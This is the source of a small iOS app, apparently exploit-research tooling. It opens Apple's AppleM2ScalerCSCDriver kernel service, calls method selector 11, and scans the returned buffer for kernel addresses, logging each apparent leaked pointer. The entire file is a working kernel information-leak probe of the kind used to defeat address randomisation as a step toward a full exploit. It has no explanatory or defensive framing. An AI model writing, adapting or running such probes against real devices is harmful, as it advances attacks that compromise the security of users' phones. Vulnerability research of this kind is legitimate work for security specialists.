#import <UIKit/UIKit.h>
#import <IOKit/IOKitLib.h>
#import <Foundation/Foundation.h>
#import <string.h>
#import <stdlib.h>
static NSMutableString *gLog; static NSString *gPath;
static void L(NSString *fmt,...){va_list ap;va_start(ap,fmt);NSString*s=[[NSString alloc]initWithFormat:fmt arguments:ap];va_end(ap);[gLog appendString:s];[gLog appendString:@"\n"];[gLog writeToFile:gPath atomically:YES encoding:NSUTF8StringEncoding error:nil];NSLog(@"[s11] %@",s);}
static uint64_t rd64(const void*p){uint64_t v;memcpy(&v,p,8);return v;}
static void run(void){
 io_service_t svc=IOServiceGetMatchingService(kIOMasterPortDefault,IOServiceMatching("AppleM2ScalerCSCDriver"));
 L(@"[svc] 0x%x",svc); if(!svc)return;
 io_connect_t c=0; kern_return_t kr=IOServiceOpen(svc,mach_task_self(),0,&c); IOObjectRelease(svc);
 L(@"[open] 0x%x conn=0x%x",kr,c); if(kr)return;
 for(int t=0;t<4;t++){
  uint8_t out[0x400]; memset(out,0xAA,sizeof(out)); size_t os=0x298;
  kr=IOConnectCallMethod(c,11,NULL,0,NULL,0,NULL,NULL,out,&os);
  L(@"[sel11 t%d] -> 0x%x osz=0x%zx",t,kr,os);
  if(kr==0){
   for(int i=0;i<0x298;i+=8){uint64_t q=rd64(out+i);
    if((q&0xfffffff000000000ULL)==0xfffffff000000000ULL||(q>=0xffffffe000000000ULL&&q<0xffffffff00000000ULL))
      L(@"[hit t%d] +0x%x = 0x%llx",t,i,(unsigned long long)q);
   }
   for(int i=0;i<0x80;i+=8) L(@"[q t%d] +0x%x=0x%llx",t,i,(unsigned long long)rd64(out+i));
  }
  break;
 }
 IOServiceClose(c); L(@"=== done ===");
}
@interface AppDelegate:UIResponder<UIApplicationDelegate>@property(strong,nonatomic)UIWindow*window;@end
@implementation AppDelegate
- (BOOL)application:(UIApplication*)app didFinishLaunchingWithOptions:(NSDictionary*)opts{
 self.window=[[UIWindow alloc]initWithFrame:[UIScreen mainScreen].bounds];UIViewController*vc=[UIViewController new];vc.view.backgroundColor=UIColor.blackColor;
 UITextView*tv=[[UITextView alloc]initWithFrame:vc.view.bounds];tv.backgroundColor=UIColor.blackColor;tv.textColor=UIColor.greenColor;tv.font=[UIFont monospacedSystemFontOfSize:9 weight:UIFontWeightRegular];tv.editable=NO;tv.text=@"Scaler11\n";
 [vc.view addSubview:tv];self.window.rootViewController=vc;[self.window makeKeyAndVisible];[UIApplication sharedApplication].idleTimerDisabled=YES;
 dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH,0),^{NSString*docs=[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask,YES) firstObject];gPath=[docs stringByAppendingPathComponent:@"s11.log"];gLog=[NSMutableString new];run();dispatch_async(dispatch_get_main_queue(),^{tv.text=gLog;});});
 return YES;}
@end
int main(int argc,char**argv){@autoreleasepool{return UIApplicationMain(argc,argv,nil,NSStringFromClass([AppDelegate class]));}}
